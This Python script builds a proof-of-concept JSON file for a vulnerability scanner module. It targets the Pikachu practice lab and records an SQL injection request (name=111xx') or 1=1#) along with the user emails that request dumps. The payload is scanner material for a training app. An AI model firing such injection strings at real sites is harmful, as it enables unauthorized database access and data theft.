import json

# 模板
template = {
  "name": "pikachu",
  "vuln":"xx型sql注入",
  "version": "",
  "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
  "type":"1",
  "mainRequest": {
    "1": {
      "request": {
        "host": "",
        "method": "",
        "path": "",
        "cookie": "",
        "requestheader": "",
        "requestbody": ""
      },
      "response": {
        "statuscode": "",
        "statusmessage": "",
        "responsetime": "",
        "responseheader": "",
        "responsebody": ""
      }
    }
  }
}


# 新数据
new_data = {
    "request": {
      "host": "",
      "method": "GET",
      "url": "/vul/sqli/sqli_x.php?name=111xx') or 1=1#&submit=查询",
      "cookie": "",
      "requestheader": "",
      "requestbody": ""
    },
    "response": {
      "statuscode": 200,
      "statusmessage": "[+] 存在xx型sql注入",
      "responsetime": "",
      "responseheader": "",
      "responsebody": "<p class='notice'>your uid:1 <br />your email is: vince@pikachu.com</p><p class='notice'>your uid:2 <br />your email is: allen@pikachu.com</p><p class='notice'>your uid:3 <br />your email is: kobe@pikachu.com</p><p class='notice'>your uid:4 <br />your email is: grady@pikachu.com</p><p class='notice'>your uid:5 <br />your email is: kevin@pikachu.com</p><p class='notice'>your uid:6 <br />your email is: lucy@pikachu.com</p><p class='notice'>your uid:7 <br />your email is: lili@pikachu.com</p>"
  }
}
  

  

# 将新数据填入模板
template["mainRequest"]["1"]["request"] = new_data["request"]
template["mainRequest"]["1"]["response"] = new_data["response"]

# 将结果写入文件
output_file_path = r"/home/qwe/VScode/pKcScan/module/Poc/pikachu/xx型sql注入.json"
with open(output_file_path, 'w', encoding='utf-8') as file:
    json.dump(template, file, indent=4, ensure_ascii=False)

print(f"填充后的 JSON 数据已写入文件: {output_file_path}")
